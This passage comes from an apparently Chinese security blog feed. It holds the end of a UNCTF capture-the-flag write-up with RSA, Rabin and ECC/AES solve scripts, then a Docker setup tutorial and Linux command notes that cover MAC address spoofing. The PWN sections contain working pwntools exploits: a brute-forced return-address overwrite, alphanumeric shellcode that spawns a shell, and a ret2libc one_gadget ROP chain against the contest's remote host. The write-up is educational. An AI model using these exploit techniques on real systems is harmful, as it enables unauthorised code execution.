= invert(e,(p2-1)*(q-1))</span><br><span class="line"></span><br><span class="line">m1 = hex(pow(c1,d1,n1))[2:].decode('hex')</span><br><span class="line">m2 = hex(pow(c2,d2,n2))[2:].decode('hex')</span><br><span class="line">print m1,m2</span><br></pre></td></tr></table></figure><p>flag：UNCTF{ac01dff95336aa470e3b55d3fe43e9f6}</p><h3 id="一句话加密"><a href="#一句话加密" class="headerlink" title="一句话加密"></a>一句话加密</h3><p>拿到文件，python文件里没有啥，正常的rsa加密，</p><p>然后用010editor打开另外一张图片，发现底下有内容</p><p><a href="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" alt="img"></a></p><p>猜测那个大数是n，先拿去分解一波，发现可行</p><p><a href="https://p0.ssl.qhimg.com/t01ecb1e951aebdcb5a.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>但是，e呢？</p><p>突然，发现被分解出来的p和q很熟悉</p><p>上<a href="https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">V爷爷博客</a>!</p><p>p、q出现在V爷爷的Rabin密码的脚本里，那么这题就是Rabin密码了，，</p><p>那么直接上V爷爷脚本</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def n2s(num):</span><br><span class="line">    t = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">       <span class="keyword">return</span> (<span class="string">'0'</span>+t).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> t.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">def decode(c):</span><br><span class="line">    p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">    q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">    n = p*q</span><br><span class="line">    r = <span class="keyword">pow</span>(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">    s = <span class="keyword">pow</span>(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">    a = gmpy2.invert(p,q)</span><br><span class="line">    b = gmpy2.invert(q,p)</span><br><span class="line">    x =(a*p*s+b*q*r)%n</span><br><span class="line">    y =(a*p*s-b*q*r)%n</span><br><span class="line">    <span class="keyword">print</span> n2s(x%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-x)%n)</span><br><span class="line">    <span class="keyword">print</span> n2s(y%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-y)%n)</span><br><span class="line"></span><br><span class="line">c1=<span class="number">62501276588435548378091741866858001847904773180843384150570636252430662080263</span></span><br><span class="line"></span><br><span class="line">c2=<span class="number">72510845991687063707663748783701000040760576923237697638580153046559809128516</span></span><br><span class="line"></span><br><span class="line">decode(c1)</span><br><span class="line">decode(c2)</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" alt="img"></a></p><p>运行得到flag：unctf{412a1ed6d21e55191ee5131f266f5178}</p><h3 id="ECC和AES基础"><a href="#ECC和AES基础" class="headerlink" title="ECC和AES基础"></a>ECC和AES基础</h3><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/</a></p><p>将底下的脚本的数据替换下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">G</span>=E(6478678675, 5636379357093)</span><br><span class="line">pub = E(2854873820564,9226233541419)</span><br><span class="line"></span><br><span class="line">c1 = E(6860981508506,1381088636252)</span><br><span class="line">c2 = E(1935961385155, 8353060610242)</span><br><span class="line"></span><br><span class="line">X = G</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 3000000):</span><br><span class="line">    <span class="keyword">if</span> X == pub:</span><br><span class="line">       <span class="built_in"> secret </span>= i</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"[+] secret:"</span>, i</span><br><span class="line">        break</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        X = X + G</span><br><span class="line">        <span class="builtin-name">print</span> i</span><br><span class="line"></span><br><span class="line">m = c2 - (c1 * secret)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x:"</span>, m[0]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] y:"</span>, m[1]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x+y:"</span>, m[0] + m[1]</span><br></pre></td></tr></table></figure><p>爆破得到secret=2019813</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x</span>=1559343440829</span><br><span class="line"> <span class="attribute">y</span>=7468915163961</span><br></pre></td></tr></table></figure><p>x即为aes_key</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">from</span> <span class="type">Crypto</span>.<span class="type">Cipher</span> <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">key</span> = bytes('<span class="number">1559343440829</span>'.ljust(<span class="number">16</span>,' '))</span><br><span class="line"><span class="title">aes</span> = <span class="type">AES</span>.new(key, <span class="type">AES</span>.<span class="type">MODE_ECB</span>)  </span><br><span class="line"><span class="class"><span class="keyword">data</span>=base64.b64decode('/<span class="title">cM8Nx</span>+<span class="title">iAidmt6RiqX8Vww</span>==')</span></span><br><span class="line"><span class="title">ans</span> = aes.decrypt(<span class="class"><span class="keyword">data</span>)</span></span><br><span class="line"><span class="title">print</span> ans</span><br></pre></td></tr></table></figure><p>发现并不能解出来</p><p>这里有点小坑，C1和C2位置互换了</p><p>于是重新跑第一个脚本，C1和C2的值互换，secret之前已经爆破出来了</p><p>得到 x=1026</p><p>AES解密得</p><p>thisisa_flag</p><p>然后去目标url post</p><p>得到</p><p><a href="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" alt="img"></a></p><p>flag：401E48C9A96DC219C32AB5E75204B655</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Sosoeasypwn"><a href="#Sosoeasypwn" class="headerlink" title="Sosoeasypwn"></a>Sosoeasypwn</h3><p>原本想泄露canary，后无意间发现，eip竟然被覆盖了，于是手测，发现输入12个a后即可控制eip。（这里输入了12个a和3个b加1个回车，可见eip被覆盖成了bbb\n）</p><p><a href="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" alt="img"></a></p><p>IDA静态分析发现，是两个函数调用了同一个栈，然后栈内数据没清理，导致部分数据被重用</p><p><a href="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" alt="img"></a></p><p>所以导致合法输入就可以覆盖v1的值。</p><p>由于开启了eip保护，但程序本身已经给了16位（4个字符），ida里可以看到后门函数的相对偏移，9CD</p><p><a href="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" alt="img"></a></p><p><a href="https://p4.ssl.qhimg.com/t0196029343f5794798.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0196029343f5794798.png" alt="img"></a></p><p>基址后12位（3个字符）都是0，那么仅需要爆破一个字符即可得到拿到shell</p><p>exp：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                </span><br><span class="line">                #sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10000</span>)</span><br><span class="line">                <span class="keyword">sh</span> = process(<span class="string">"./pwn"</span>)</span><br><span class="line">              base_addr = <span class="keyword">sh</span>.recvuntil(<span class="string">' world'</span>)</span><br><span class="line">              base_addr = hex(<span class="keyword">int</span>(base_addr[-<span class="number">11</span>:-<span class="number">6</span>]))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'So, Can you tell me your name?'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.send(<span class="string">'a'</span>*<span class="number">12</span>+p32(<span class="keyword">int</span>(base_addr+<span class="string">'89cd'</span>,<span class="number">16</span>))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'Please'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.sendline(<span class="string">'ls'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">       except Exception <span class="keyword">as</span> <span class="keyword">e</span>:</span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" alt="img"></a></p><p>得到flag：UNCTF{S0soE4zy_Pwn}</p><h3 id="EasyShellcode"><a href="#EasyShellcode" class="headerlink" title="EasyShellcode"></a>EasyShellcode</h3><p>反汇编看程序逻辑，就只是限制了shellcode的字符，要求在A-Za-z0-9之间</p><p>直接上V爷爷将shellcode转base64的工具</p><p><a href="https://github.com/veritas501/ae64" target="_blank" rel="noopener">https://github.com/veritas501/ae64</a></p><p>exp：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'101.71.29.5'</span>,<span class="number">10080</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say?\n'</span>)</span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(sc)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" alt="img"></a></p><p>flag：UNCTF{x64A5c11shE11c0dEi550_Ea5y}</p><h3 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h3><p><a href="https://p2.ssl.qhimg.com/t01759f7cce9c0eaea9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>这个很好绕过</p><p><a href="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" alt="img"></a></p><p>发现有一个栈溢出，而且retaddr做了限制，这样就不能直接ret到system了（这里我用的是one_gadget），但是可以找gadget绕过（这里我找的是 ret ）</p><p>其中libc版本用LibcSearcher泄露出来，然后payload的偏移需要用’\x00’来填充，以满足one_gadget的条件。</p><p><a href="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" alt="img"></a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyrop')</span></span><br><span class="line">sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048592</span></span><br><span class="line">ret = <span class="number">0x0804839e</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span>  + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">addr = u32(sh.recvuntil(<span class="string">'\xf7'</span>)[<span class="number">-5</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x3a819</span></span><br><span class="line"><span class="comment">#one_gadget = base + 0x3ac69</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">8</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span> + p32(ret) +p32(one_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装Docker 和 Docker-Compose以及docker images的制作及上传</title>
      <link href="/2019/11/01/docker%E5%92%8Cdocker-compose%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2019/11/01/docker%E5%92%8Cdocker-compose%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h3 id="安装Docker-和-Docker-Compose。"><a href="#安装Docker-和-Docker-Compose。" class="headerlink" title="安装Docker 和 Docker-Compose。"></a>安装Docker 和 Docker-Compose。</h3><p>Docker：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -<span class="keyword">y</span> yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"></span><br><span class="line">sudo yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span> docker-<span class="keyword">ce</span>-cli containerd.io</span><br><span class="line"></span><br><span class="line">yum <span class="keyword">list</span> docker-<span class="keyword">ce</span> --showduplicates | <span class="keyword">sort</span> -r</span><br><span class="line"></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span>-<span class="symbol">&lt;VERSION_STRING&gt;</span> docker-<span class="keyword">ce</span>-cli-<span class="symbol">&lt;VERSION_STRING&gt;</span> containerd.io</span><br><span class="line"><span class="keyword">e</span>.<span class="variable">g:</span></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span>-docker-<span class="keyword">ce</span>-<span class="number">18.09</span>.<span class="number">1</span> docker-<span class="keyword">ce</span>-cli-docker-<span class="keyword">ce</span>-<span class="number">18.09</span>.<span class="number">1</span> containerd.io</span><br><span class="line"></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p>Docker-Compose</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> python-pip</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade setuptools</span></span><br><span class="line">pip <span class="keyword">install</span> more-itertools==<span class="number">5.0</span><span class="number">.0</span></span><br><span class="line">pip <span class="keyword">install</span> docker-compose</span><br></pre></td></tr></table></figure><h3 id="docker-images的制作及上传"><a href="#docker-images的制作及上传" class="headerlink" title="docker images的制作及上传"></a>docker images的制作及上传</h3><h4 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h4><p>dockerfile啥的文件得先准备好~</p><p>然后进入到有docker-compose.yml文件的目录</p><p><code>docker build -t ID/repo:tag ./</code></p><p>比如</p><p><code>docker build -t jayxv/dockerfiles:web1 ./</code></p><p>查看确认</p><p><code>docker images</code></p><h4 id="登陆dockerhub"><a href="#登陆dockerhub" class="headerlink" title="登陆dockerhub"></a>登陆dockerhub</h4><p><code>docker login</code></p><h4 id="上传至dockerhub"><a href="#上传至dockerhub" class="headerlink" title="上传至dockerhub"></a>上传至dockerhub</h4><p><code>docker push jayxv/dockerfiles:web1</code>（确保image的ID和仓库名与你的dockerhub上的账户名一致~）</p><h4 id="拉到本地"><a href="#拉到本地" class="headerlink" title="拉到本地"></a>拉到本地</h4><p><code>docker pull jayxv/dockerfiles:web1</code></p><h3 id="运行docker"><a href="#运行docker" class="headerlink" title="运行docker"></a>运行docker</h3><p>docker run -d -p 9999:9999 jayxv/dockerfiles:web1</p><h3 id="进入docker"><a href="#进入docker" class="headerlink" title="进入docker"></a>进入docker</h3><p>docker exec -it 容器id /bin/sh </p><h3 id="导出镜像"><a href="#导出镜像" class="headerlink" title="导出镜像"></a>导出镜像</h3><p> docker save &gt; web1.tar jayxv/dockerfiles:web1</p><h3 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h3><p>docker load &lt;  web1.tar</p>]]></content>
      
      
      <categories>
          
          <category> 工具小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 基础</title>
      <link href="/2019/09/12/Linux%20%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/09/12/Linux%20%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-文件系统"><a href="#Linux-文件系统" class="headerlink" title="Linux 文件系统"></a>Linux 文件系统</h2><p>逻辑文件系统</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">文件系统的根（/）位于文件系统目录树的顶部，以下是要了解的最重要的子目录： </span><br><span class="line"><span class="string">/root</span> root 用户的主目录 </span><br><span class="line"><span class="string">/etc</span> 通常包含 Linux 配置文件 - 控制程序启动时间和方式的文件 </span><br><span class="line"><span class="string">/home</span> 用户的主目录 </span><br><span class="line"><span class="string">/mnt</span> 将其他文件系统附加或安装到文件系统的位置 </span><br><span class="line"><span class="string">/media</span> CD 和 USB 设备通常连接或安装到文件系统的位置 </span><br><span class="line"><span class="string">/bin</span> 其中包含应用程序二进制文件（相当于 Microsoft Windows 中的可执行文件） </span><br><span class="line"><span class="string">/lib</span> lib 库文件（与 Windows DLL 类似的共享程序）</span><br></pre></td></tr></table></figure><h2 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h2><p>pwd    查看当前目录</p><p>whoami    查看登录用户</p><p>cd    更改目录</p><p>ls    列出目录内容</p><p>ls -l    列出目录输出为长列表</p><p>ls -a（ls -la）列出内容包括隐藏文件、</p><p>sth - help    获取帮助</p><p>man sth    使用man引用手册页</p><h3 id="搜索查找"><a href="#搜索查找" class="headerlink" title="搜索查找"></a>搜索查找</h3><p>locate sth    此命令将遍历整个 文件系统并找到该单词的每个匹配项。 </p><p>whereis sth    此命令不仅返回二进制文件的位置，还返 回其源和手册页（如果可用）。</p><p>which sth    在PATH变量中查找二进制文件</p><p>find：</p><p>​        语法：find directory options expression </p><p>​        例：find / -type f -name apache2.*            (f表示普通文件)</p><p>ps aux    提供了在这个系统中运行的所有进程的列表 </p><p>grep 过滤关键字（配合管道符）</p><p>cat    显示文件</p><p>cat &gt;    创建小文件（CTRL-D保存）</p><p>cat &gt;&gt;    附加</p><p>touch filename    创建名为filename的文件</p><p>mkdir \dirname    创建目录</p><p>cp oldfilename path/newfilename    复制文件</p><p>mv oldfile newfile    迂回重命名文件</p><p>rm filename    删除文件</p><p>rmdir dirname    删除空目录</p><p>rm -r dirname    删除目录及文件</p><p>head filename    查看开头前（默认）十行</p><p>head -20 filename    查看开头前20行</p><p>tail filename    同head，查看文件尾</p><p>nl filename    显示行号</p><p>例：tail  -n+507  /etc/snort/snort.conf  |  head  -n  6</p><p>sed  查找和替换</p><p>例：sed    s/mysql/MySQL/g  /etc/snort/snort.conf  &gt;  snort2.conf</p><p>s 参数提供搜索，你先提供想要搜索的关键词 (mysql) 然后提供想要替换成的关键词 (MySQL), 用斜杠 (/)分开。g 参数告诉 Linux 你希望全局替换，然后将结果保存到一个新文件 snort2.conf。 </p><p>如果你只想替换第一个出现的 mysql，你需要去掉末尾的 g 参数。 </p><p>你也可以使用 sed 命令查找替换第一个出现字段以外的任意位置出现的字段。例如，如果你想只替换 第二个出现的 mysql，</p><p>sed  s/mysql/MySQL/2  snort.conf  &gt;  snort2.conf </p><p>more filename    控制显示文件    enter键换行</p><p>less filename    按下斜杠键（/）， 输入（output），这会立即将你带到第一个出现 output 的地方，并且高亮了 output。然后你可以按 n 键（next）到下一 个出现 （output ）的地方。 </p><h2 id="分析和管理网络"><a href="#分析和管理网络" class="headerlink" title="分析和管理网络"></a>分析和管理网络</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>eth0（Ethernet0）第一个有线以太网接口</p><p>Ethernet     以太网</p><p>HWaddr    每个网络硬件上标记的全局唯一标记，在这种情况下，网络接口卡 network interface card (NIC), 通常指的是媒体访问控制 media access control (MAC) 地址。 </p><p>inet addr    分配IP地址信息的网络接口     </p><p>Bcast    广播地址，用于向子网上的所有 IP 发送信息的地址;</p><p>Mask    子网掩码，用于确定 IP 地 址的哪个部分连接到本地网络</p><p>lo     环回地址（loopback address）    并且有时称为 localhost    这是个特殊的软件地址，可帮助你连接到自己的系统。未在系统上运行的软件和服务将 无法被使用。你可以使用 lo 在你的系统测试某些内容，例如你自己的 web 服务器。本地主机通常用 IP 地 址 127.0.0.1 表示。 </p><p>wlan0    只有当拥有无线接口或适配器时，才会出现这种情况。请注意，它还 会显示该设备 (HWaddr)的 MAC 地址。 </p><p>来自 ifconfig 的此信息使您可以连接并操作局域网 (LAN) 设置，这是黑客攻击的基本技能（内网穿透么？）</p><h3 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;iwconfig </span><br><span class="line">wlan0 IEEE 802.11bg ESSID:off/any </span><br><span class="line">Mode:Managed Access Point: <span class="keyword">Not</span> Associated <span class="attribute">Tx-Power</span>=20 dBm </span><br><span class="line">­­snip-- </span><br><span class="line">lo <span class="literal">no</span><span class="built_in"> wireless </span>extensions  </span><br><span class="line">eth0 <span class="literal">no</span><span class="built_in"> wireless </span>extensions</span><br></pre></td></tr></table></figure><p>对于 wlan0，我们了解了我们的设备能够支持的 802.11 IEEE 无线标准：b 和 g ， 两种早期的无线通 信标准。现在大多数无线设备也包括 n ( n 是最新的标准)。 </p><p>我们还从 iwconfig 中学习了无线扩展的模式(本例中为 Mode:Manage，不同于 monitor 或 promiscuous mode)。在破解无线密码时，我们需要使用到混杂模式(promiscuous mode)。 </p><p>接下来，我们将看到无线网卡（适配器）未连接（未关联）到接入点 (AP) ，并且其功率为 20 dBm， 这表示信号强度。 </p><h3 id="更改你的网络信息"><a href="#更改你的网络信息" class="headerlink" title="更改你的网络信息"></a>更改你的网络信息</h3><p>ifconfig  eth0  192.168.181.115  netmask  255.255.0.0  broadcast  192.168.1.255     </p><p>使用 ifconfig 命令改变你的IP，子网掩码，广播地址</p><p>伪装MAC（ HWaddr ）地址：</p><p>​        简单地使用 ifconfig 命令的 down 选项来关闭该接口 </p><p>​        然后输入 ifconfig 命令并加上接口名称 (hw 表示硬件，ether 表示以太网) 和新的伪造 MAC 地 </p><p>​        最后，使用选项 up 备份接口以进行更改。 </p><p>例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">down</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">hw</span>  <span class="selector-tag">ether</span>  00<span 